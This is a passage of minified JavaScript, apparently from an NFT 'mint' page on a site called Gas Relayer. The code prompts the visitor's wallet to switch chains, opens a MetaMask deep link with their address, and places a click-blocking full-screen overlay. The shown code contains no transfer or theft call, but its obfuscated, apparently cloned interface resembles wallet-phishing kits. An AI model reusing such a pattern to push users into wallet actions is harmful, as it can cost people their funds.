d.request({method:"wallet_addEthereumChain",params:[{chainId:"0x1",rpcUrl:"https://mainnet.infura.io/"}]})}catch(e){console.error(e),$(".mint-k1").prop("disabled",!1),$(".smsmssmdke").hide(),$(".marfor, .subvms").show()}else $(".mint-k1").prop("disabled",!1),$(".smsmssmdke").hide(),$(".marfor, .subvms").show()}else a()}catch(e){$(".mint-k1").prop("disabled",!1),$(".smsmssmdke").hide(),$(".marfor, .subvms").show()}else l?a():(window.open("https://metamask.app.link/dapp/gasrelayer.com/"+address),$(".mint-k1").prop("disabled",!1),$(".smsmssmdke").hide(),$(".marfor, .subvms").show())})}}).catch(e=>console.error(e))}):($(".noifad , .st--c-eDSdwh-jlkAgt-size-0 , #loader").remove(),$(".alert").css("display","flex"),$(".alert-t").html("That's not an address"),$(".alert-d").html("No problem! You can easily search for your collection on Gas Relayer."),$(".yt").fadeIn(),$("body").css("overflow","hidden"),welcome()),$("#ok-il").click(function(){$(".alert , .noifad").remove(),setTimeout(()=>{$(".glu-logos").click()},1),$(".st--c-PJLV-ijCwIQL-css").css({display:"block",transform:"translate3d(0px, 0px, 0px)",opacity:1,position:"fixed",inset:"0px","z-index":990,"background-color":"var(--st--colors-black40)","pointer-events":"all",transition:"opacity var(--st--transitions-2) var(--st--transitions-ease)"}).prop("id",!1),$(".st--c-PJLV-ijCwIQL-css").click(function(e){return e.stopPropagation(),!1})}),$(".st--c-PJLV-idfnBVB-css").click(function(){var e=$('<div id="nprogress"><div class="bar" role="bar"></div></div>');$("body").append(e),$(".bar").css({transform:"translate3d(-86%, 0px, 0px)",transition:"all 500ms ease 0s",background:"#007aff",height:"3px"}),setTimeout(function(){$(".bar").css("transform","translate3d(-50%, 0px, 0px)")},500),setTimeout(function(){$(".bar").css("transform","translate3d(-15%, 0px, 0px)")},800)});
